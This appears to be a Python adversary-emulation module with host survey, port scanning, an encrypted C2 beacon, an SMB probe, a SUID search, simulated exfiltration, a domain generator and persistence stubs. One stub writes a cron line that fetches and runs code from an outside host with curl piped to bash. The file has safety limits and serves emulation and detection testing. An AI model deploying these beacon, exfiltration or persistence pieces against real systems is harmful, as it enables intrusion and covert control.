#!/usr/bin/env python3
"""
Red Team Tools
Advanced Emulation Capabilities: Reconnaissance (Priority), HTTP/S Traffic, DGA, Persistence
"""

import os
import random
import time
import socket
import urllib.request
import urllib.parse
import base64
import string
import logging
import json
import ssl
import subprocess
import platform
from c2_crypto import c2_crypto
from safety_controls import interlock

# --- RECONNAISSANCE MODULES ---

class SystemSurveyor:
    def collect_system_info(self):
        """Gathers extensive system intelligence."""
        info = {
            "os": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "arch": platform.machine(),
            "hostname": socket.gethostname(),
            "users": self._get_users(),
            "network": self._get_network_interfaces()
        }
        return info

    def _get_users(self):
        try:
            return subprocess.check_output("cut -d: -f1 /etc/passwd", shell=True, text=True).splitlines()
        except: return []

    def _get_network_interfaces(self):
        try:
            # Basic ifconfig/ip addr simulation/check
            return subprocess.check_output("ip addr", shell=True, text=True).splitlines()
        except: return []

class NetworkSniffer:
    def scan_active_services(self):
        """
        Passive-ish service enumeration.
        Checks for common listening ports on localhost to map the attack surface.
        """
        services = {}
        common_ports = {
            22: "SSH", 80: "HTTP", 443: "HTTPS",
            3306: "MySQL", 5432: "PostgreSQL",
            8080: "Alt-HTTP", 27017: "MongoDB", 6379: "Redis"
        }

        for port, service in common_ports.items():
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.1)
                    if s.connect_ex(('127.0.0.1', port)) == 0:
                        # Banner Grab
                        try:
                            s.send(b"HEAD / HTTP/1.0\r\n\r\n")
                            banner = s.recv(1024).decode(errors='ignore').strip()
                            services[port] = banner if banner else service
                        except:
                            services[port] = service
            except: pass
        return services

# --- ATTACK MODULES ---

class TrafficGenerator:
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
        "curl/7.68.0",
        "Wget/1.20.3 (linux-gnu)"
    ]

    def _generate_payload(self, size=64):
        data = {
            "uid": os.getuid() if hasattr(os, 'getuid') else 0,
            "host": socket.gethostname(),
            "nonce": random.randint(1000,9999),
            "padding": "A" * size
        }
        return c2_crypto.encrypt(data)

    def send_http_beacon(self, ip, port=443):
        actual_ip, actual_port, redirected = interlock.check_connection(ip, port)
        try:
            proto = "https" if actual_port == 443 else "http"
            url = f"{proto}://{actual_ip}:{actual_port}/api/v1/secure/status"
            encrypted_body = self._generate_payload()

            req = urllib.request.Request(url, data=encrypted_body.encode('utf-8'))
            req.add_header('User-Agent', random.choice(self.USER_AGENTS))
            req.add_header('Content-Type', 'application/octet-stream')
            req.add_header('X-Auth-Token', 'eccd0a33-2892-4916-924b-008323498871')

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            with urllib.request.urlopen(req, timeout=3, context=ctx) as r:
                return r.status
        except (urllib.error.URLError, socket.timeout, ConnectionRefusedError):
            return 0
        except Exception:
            return 0

class LateralMover:
    def scan_local_subnet(self):
        targets = []
        try:
            common_ports = [22, 445, 80, 8080, 3389]
            for port in common_ports:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.1)
                    if s.connect_ex(('127.0.0.1', port)) == 0:
                        targets.append(('127.0.0.1', port))
        except: pass
        return targets

    def attempt_smb_spread(self, target_ip):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                s.connect((target_ip, 445))
                s.send(b"\x00\x00\x00\x85\xff\x53\x4d\x42")
                return True
        except: return False

class PrivEsc:
    def check_suid(self):
        try:
            cmd = "find / -perm -4000 -type f 2>/dev/null | head -n 5"
            output = subprocess.check_output(cmd, shell=True, text=True)
            return output.splitlines()
        except: return []

    def check_kernel_exploit(self):
        try:
            uname = os.uname().release
            return True if "generic" in uname else False
        except: return False

class ExfiltrationEngine:
    def chunked_exfil(self, target_ip, data_size_mb=1):
        chunk_size = 1024 * 10
        total_bytes = data_size_mb * 1024 * 1024
        sent_bytes = 0
        while sent_bytes < total_bytes:
            chunk = os.urandom(chunk_size)
            encrypted_chunk = c2_crypto.encrypt({"chunk": base64.b64encode(chunk).decode()})
            try:
                url = f"http://{target_ip}:80/upload"
                req = urllib.request.Request(url, data=encrypted_chunk.encode('utf-8'))
                req.add_header('X-Exfil-ID', 'DATA_DUMP_001')
                with urllib.request.urlopen(req, timeout=1): pass
            except: pass
            sent_bytes += chunk_size
            time.sleep(0.1)
        return True

class DGA:
    def generate_domain(self):
        tld = random.choice(['.com', '.net', '.org', '.info', '.biz'])
        length = random.randint(8, 20)
        domain = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length)) + tld
        return domain
    def resolve_domain(self, domain):
        try:
            socket.gethostbyname(domain)
            return True
        except: return False

class PersistenceManager:
    def install_cron(self):
        try:
            with open("/tmp/malicious.cron", "w") as f:
                f.write("* * * * * /bin/bash -c 'curl -k https://1.2.3.4/run | bash'\n")
            return True
        except: return False
    def install_bashrc(self):
        try:
            with open("/tmp/.bashrc_backdoor", "w") as f:
                f.write("alias ls='ls --color=auto; /tmp/malware &'\n")
            return True
        except: return False

if __name__ == "__main__":
    s = SystemSurveyor()
    # print(s.collect_system_info())
